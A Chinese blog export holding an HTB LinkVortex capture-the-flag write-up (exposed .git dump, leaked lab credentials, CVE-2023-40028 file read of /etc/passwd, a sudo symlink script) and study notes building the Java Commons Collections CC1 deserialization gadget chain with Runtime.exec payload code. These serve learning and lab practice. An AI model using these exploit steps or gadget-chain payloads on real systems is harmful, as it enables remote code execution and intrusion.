<p>查阅资料，知道了有个项目叫GitHack,它从.git 文件夹重建源代码，同时保持目录结构不变。</p>
<p>项目链接：<a class="link" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GitHack.py http://dev.linkvortex.htb/.git/</span><br></pre></td></tr></table></figure>

<p>使用如上命令把他的整个项目源代码恢复下来</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214170917830.png" alt="image-20241214170917830"></p>
<p>里面全是文件夹，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/kali/tools/GitHack/dev.linkvortex.htb/ghost/core/test/regression/api/admin</span><br></pre></td></tr></table></figure>

<p>只有这个目录有个js文件，查看后发现有很多password关键字<img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214171602573.png" alt="image-20241214171602573"></p>
<p>网上搜了下这个CMS的后台地址</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214171853291.png" alt="image-20241214171853291"></p>
<p>随便找了几个账密试了一下，但是试了几下都没试出来，红温了，写个脚本提取里面的账密用burp全部跑了一遍发现都没有进去，这时候开始观察账户名是否是错的，发现那个文件里的都是@example.com后缀，遂尝试<a class="link" href="mailto:&#97;&#x64;&#109;&#105;&#110;&#64;&#x6c;&#105;&#x6e;&#107;&#118;&#x6f;&#114;&#116;&#x65;&#x78;&#x2e;&#x68;&#x74;&#98;">&#97;&#x64;&#109;&#105;&#110;&#64;&#x6c;&#105;&#x6e;&#107;&#118;&#x6f;&#114;&#116;&#x65;&#x78;&#x2e;&#x68;&#x74;&#98;<i class="fas fa-external-link-alt"></i></a></p>
<p>和第一个密码进行登录，然后就进入后台了</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">username: admin@linkvortex.htb</span><br><span class="line">password: OctopiFociPilfer45</span><br></pre></td></tr></table></figure>





<h2 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h2><p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174031738.png" alt="image-20241214174031738"></p>
<p>进入后台溜达了一下发现没有什么东西，之前找到的git文件可以看得见这个CMS的版本号是5.58，遂上网查一下公开漏洞</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174141719.png" alt="image-20241214174141719"></p>
<p><a class="link" href="https://security.snyk.io/package/npm/ghost/5.58.0">https://security.snyk.io/package/npm/ghost/5.58.0<i class="fas fa-external-link-alt"></i></a></p>
<p>在以上站点可以看得到5.58这个版本存在的公开漏洞，大多数都是些xss什么的，没啥利用价值，只有一个任意文件读取值得一看</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174344547.png" alt="image-20241214174344547"></p>
<p>点进去知悉此漏洞编号是<a class="link" href="https://www.cve.org/CVERecord?id=CVE-2023-40028">CVE-2023-40028 (opens in a new tab)<i class="fas fa-external-link-alt"></i></a>，在google查找CVE-2023-40028 Github找到了<a class="link" href="https://github.com/0xyassine/CVE-2023-40028">POC<i class="fas fa-external-link-alt"></i></a> 下载下来</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214174755384.png" alt="image-20241214174755384"></p>
<p>修改POC脚本中的参数为我们的目标</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@redpomelo] /home/kali/temp </span><br><span class="line">❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</span><br><span class="line">WELCOME TO THE CVE-2023-40028 SHELL</span><br><span class="line">file&gt; /etc/passwd</span><br><span class="line"> </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">node:x:1000:1000::/home/node:/bin/bash</span><br></pre></td></tr></table></figure>

<p>成功读取到了&#x2F;etc&#x2F;passwd，在之前我们用GitHack弄出来的文件中还有一个Dockerfile</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195315043.png" alt="image-20241214180453434"></p>
<p>这里的名字长得就像是配置文件，查看后得到用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:bob@linkvortex.htb</span><br><span class="line">password:fibber-talented-worth</span><br></pre></td></tr></table></figure>

<p>尝试ssh登录</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214181807665.png" alt="image-20241214181807665"></p>
<p>卡了一个多小时没连上去，心态炸了</p>
<p>用HTB的盒子连上去了，成功进入系统，</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214194847592.png" alt="image-20241214194847592"></p>
<p>成功拿到flag~</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>速度得快点了，免费的盒子只有几分钟时间，快到期了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty, env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br></pre></td></tr></table></figure>

<p>sudo -l检查当前用户的权限，发现可以访问&#x2F;opt&#x2F;ghost&#x2F;clean_symlink.sh *.png</p>
<p>看一下这是个啥东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">cat</span> /opt/ghost/clean_symlink.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">QUAR_DIR=<span class="string">&quot;/var/quarantined&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$CHECK_CONTENT</span> ];<span class="keyword">then</span></span><br><span class="line">  CHECK_CONTENT=<span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">LINK=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="string">&quot;<span class="variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;! First argument must be a png file !&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="variable">$LINK</span>;<span class="keyword">then</span></span><br><span class="line">  LINK_NAME=$(/usr/bin/basename <span class="variable">$LINK</span>)</span><br><span class="line">  LINK_TARGET=$(/usr/bin/readlink <span class="variable">$LINK</span>)</span><br><span class="line">  <span class="keyword">if</span> /usr/bin/echo <span class="string">&quot;<span class="variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="string">&#x27;(etc|root)&#x27;</span>;<span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;! Trying to read critical files, removing link [ <span class="variable">$LINK</span> ] !&quot;</span></span><br><span class="line">    /usr/bin/unlink <span class="variable">$LINK</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Link found [ <span class="variable">$LINK</span> ] , moving it to quarantine&quot;</span></span><br><span class="line">    /usr/bin/mv <span class="variable">$LINK</span> <span class="variable">$QUAR_DIR</span>/</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$CHECK_CONTENT</span>;<span class="keyword">then</span></span><br><span class="line">      /usr/bin/echo <span class="string">&quot;Content:&quot;</span></span><br><span class="line">      /usr/bin/cat <span class="variable">$QUAR_DIR</span>/<span class="variable">$LINK_NAME</span> 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195315043.png" alt="image-20241214195315043"></p>
<p>喂给AI来解答</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195656225.png" alt="image-20241214195656225"></p>
<p>这样就拿到了FLag</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214195607836.png" alt="image-20241214195607836"></p>
<p>至此就拿下全部Flag咯</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前期都是简简单单的信息搜集，提权部分不像传统信息搜集，这个靶机还是偏入门,没有涉及什么很超纲的知识点</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons Collections链1</title>
    <url>/2024/12/01/Commons-Collections%E9%93%BE1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一篇学习笔记，学习前辈们总结出的知识，感谢<a class="link" href="https://www.bilibili.com/video/BV1no4y1U7E1%22Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E7%AF%87(%E4%B8%80">白日梦组长<i class="fas fa-external-link-alt"></i></a> CC1链手写EXP”)以及<a class="link" href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Drunkbaby师傅<i class="fas fa-external-link-alt"></i></a>的博客，还有Drunkbaby师傅微信群里的各位的耐心解答，站在前人的肩膀上，学习着前辈们的知识，如果没有前人踩过的坑那么肯定我自己要多踩很多很多坑，感谢各位大佬的奉献！！！</p>
<h1 id="CommonsCollections是什么"><a href="#CommonsCollections是什么" class="headerlink" title="CommonsCollections是什么"></a>CommonsCollections是什么</h1><p><a class="link" href="http://commons.apache.org/">Apache Commons<i class="fas fa-external-link-alt"></i></a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）</p>
<p>具体介绍可以看<a class="link" href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">闪烁之狐<i class="fas fa-external-link-alt"></i></a>大佬的博客</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>由于该漏洞在JDK8u71后就被修复，遂使用8u65版本</p>
<h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK:"></a>JDK:</h2><p><a class="link" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一:"></a>踩坑一:</h3><p>官网点8u65下载下来是8u111，原因不明</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法:"></a>解决方法:</h4><p>把url链接中的cn删去，页面就切换成了英文，此时下载就是正确的</p>
<h2 id="Maven导入"><a href="#Maven导入" class="headerlink" title="Maven导入"></a>Maven导入</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>不能高于这个版本，不然漏洞就修了</p>
<h2 id="OpenJDK"><a href="#OpenJDK" class="headerlink" title="OpenJDK"></a>OpenJDK</h2><p><a class="link" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/<i class="fas fa-external-link-alt"></i></a></p>
<p>把下载的openjdk里 &#x2F;share&#x2F;classes&#x2F; 里面的 sun包 复制到 jdk1.8.0_65（先解压jdk里自带的src源码）</p>
<h3 id="踩坑二："><a href="#踩坑二：" class="headerlink" title="踩坑二："></a>踩坑二：</h3><p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/b3c8341d782c6d4d99d04c4f28943ca.png" alt="b3c8341d782c6d4d99d04c4f28943ca"></p>
<p>按理来说点击下载源代码就能直接下载了，此处一直报错</p>
<h4 id="解决方法一："><a href="#解决方法一：" class="headerlink" title="解决方法一："></a>解决方法一：</h4><p>手动去Maven官网下载源码，而后点击右边那个按钮手动选择源代码</p>
<p>下载地址：<a class="link" href="https://maven.icm.edu.pl/artifactory/repo/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar">https://maven.icm.edu.pl/artifactory/repo/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar<i class="fas fa-external-link-alt"></i></a>  </p>
<h4 id="解决方法二："><a href="#解决方法二：" class="headerlink" title="解决方法二："></a>解决方法二：</h4><p>换阿里源，相关教程网上挺多的不在赘述</p>
<h1 id="TransformMap攻击链分析"><a href="#TransformMap攻击链分析" class="headerlink" title="TransformMap攻击链分析"></a>TransformMap攻击链分析</h1><p>在分析链子之前，首先明确一下反序列化漏洞的思路</p>
<p>反序列化漏洞形成的原因是接收任意对象，执行readObject</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241129223839806.png" alt="image-20241129223839806"></p>
<h2 id="尾部exec执行方法"><a href="#尾部exec执行方法" class="headerlink" title="尾部exec执行方法"></a>尾部exec执行方法</h2><p>有一个Transform接口</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241129224554916.png" alt="image-20241129224554916"></p>
<p>Ctrl+H查看这个接口的实现类，有一个invokerTranformer的实现类，这个实现类往下翻发现了以下代码：</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130125739401.png" alt="image-20241130125739401"></p>
<p>，这个transform方法从构造函数中接收任何参数，造成了反射调用任意类，接下来我们尝试构造使用这个类弹计算器</p>
<h3 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h3><p>可以看到他的有参构造需要接收三个参数</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130130335850.png" alt="image-20241130130335850"></p>
<p>根据他的有参构造构成我们的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130130746772.png" alt="image-20241130130746772"></p>
<p>可以看到成功的执行了命令</p>
<h2 id="寻找链子"><a href="#寻找链子" class="headerlink" title="寻找链子"></a>寻找链子</h2><p>右键——》find usages</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130194721621.png" alt="image-20241130194721621"></p>
<p>查看有哪些不同名的类调用了transform方法，这里有24个</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130195624661.png" alt="image-20241130195624661"></p>
<p>因为这个TransformedMap好几处都调用了，所以从这里开始入手，接下来去看看<code>valueTransformer.checkSetValue</code> 的 <code>valueTransformer</code> 是什么东西，找到构造函数进行查看</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130200704051.png" alt="image-20241130200704051"></p>
<p>这个构造方法的功能有点像是动态代理里的调用处理器，他的构造函数是以protected修饰符修饰的，所以他的作用域局限为类内，我们就得去寻找谁调用了他，然后找到了<strong>decorate</strong></p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130201152687.png" alt="image-20241130201152687"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//当他执行的时候，会调用invokerTransformer的transform方法</span></span><br><span class="line">    TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来回过头去看checkSetValue,只有Abs….这个什么玩意调用了它</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130202413789.png" alt="image-20241130202413789"></p>
<p>这是一个抽象类，是 <code>TransformedMap</code> 的父类，调用 <code>checkSetValue</code> 方法的类是 <code>AbstractInputCheckedMapDecorator</code> 类中的一个内部类 <code>MapEntry</code></p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130211034365.png" alt="image-20241130211034365"></p>
<p><code>setValue()</code> <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 <code>setValue()</code> 操作。，</p>
<p>最后在<strong>AnnotationInvocationHandler</strong>这个类里面找到了readObject()方法中调用了setValue！</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241130213406776.png" alt="image-20241130213406776"></p>
<p><code>InvocationHandler</code> 这个后缀，一般是在动态代理中用作动态代理中间处理，因为它继承了<code>InvocationHandler</code> 接口。</p>
<h1 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h1><p>学到这里脑子有点乱，感觉似懂非懂的感觉，自己画了一遍流程图理了一下思路</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201121431071.png" alt="image-20241201121431071"></p>
<p>现在我们明确了链首为<strong>AnnotationInvocationHandler</strong>,可以注意到这个类没写是public的，没写就是默认default，只能在当前包调用，所以我们就</p>
<p><code>readObject</code> 的方法是类 <code>AnnotationInvocationHandler</code> 的，<code>AnnotationInvocationHandler</code> 的作用域为 <code>default</code>，我们需要通过反射的方式来获取这个类及其构造函数，再实例化它</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201191722321.png" alt="image-20241201191722321"></p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;wozhenshuai&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射获取链首</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这是理想状态下的EXP，但这是无法正常运行的，我们现在面临着三个问题：</p>
<blockquote>
<ol>
<li><code>Runtime</code> 对象不可序列化，需要通过反射将其变成可以序列化的形式</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li><code>setValue()</code> 的传参，是需要传 <code>Runtime</code> 对象的；而在实际情况当中的 <code>setValue()</code> 的传参是这个东西：</li>
</ol>
</blockquote>
<blockquote>
<ol start="3">
<li>要进入 <code>setValue</code> 的两个 if 判断</li>
</ol>
</blockquote>
<p>现在我们来逐个解决：</p>
<h2 id="解决Runtime不能序列化"><a href="#解决Runtime不能序列化" class="headerlink" title="解决Runtime不能序列化"></a>解决Runtime不能序列化</h2><p>Runtime类是不能被序列化的，但是Runtime.Class是可以被序列化的，我们可以通过反射让Runtime进行序列化，这里回顾写一遍反射进行Runtime序列化</p>
<h3 id="普通反射进行Runtime序列化"><a href="#普通反射进行Runtime序列化" class="headerlink" title="普通反射进行Runtime序列化"></a>普通反射进行Runtime序列化</h3><p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201200357970.png" alt="image-20241201200357970"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通反射进行Runtime</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(Runtime.getRuntime(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>现在将普通反射改造为InvokerTransformer类进行反射序列化</p>
<h3 id="InvokerTransformer-类进行序列化"><a href="#InvokerTransformer-类进行序列化" class="headerlink" title="InvokerTransformer 类进行序列化"></a>InvokerTransformer 类进行序列化</h3><p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201201633140.png" alt="image-20241201201633140"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//InvokerTransformer 类进行序列化</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="comment">// 对应普通反射Method m = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="comment">// 对应普通反射m.invoke(Runtime.getRuntime(), &quot;calc&quot;);</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这么写实在是不够优雅，观察到：</p>
<ul>
<li>格式都为<code>new InvokerTransformer().invoke()</code></li>
<li>后一个 <code>invoke()</code> 方法里的参数都是前一个的结果</li>
</ul>
<p>所以我们使用了<strong>ChainedTransformer</strong>类来优化我们的代码，这个类的代码如下，功能就是用来进行处理链式调用的</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201202242496.png" alt="image-20241201202242496"></p>
<h4 id="优化代码"><a href="#优化代码" class="headerlink" title="优化代码"></a>优化代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Transformer数组</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建ChainedTransformer</span></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ChainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>使用ChainedTransformer优化代码后，顿时整洁了不少</p>
<h2 id="绕过两个if"><a href="#绕过两个if" class="headerlink" title="绕过两个if"></a>绕过两个if</h2><p>Runtime 的问题已经解决完毕。但是我们的 EXP 运行时不会弹出计算器，是因为我们的 EXP 并没有 <code>transformer</code> 的调用。我们可以调试一下，去看看问题出在哪里</p>
<p><img src="/2024/12/01/Commons-Collections%E9%93%BE1/image-20241201205028401.png" alt="image-20241201205028401"></p>
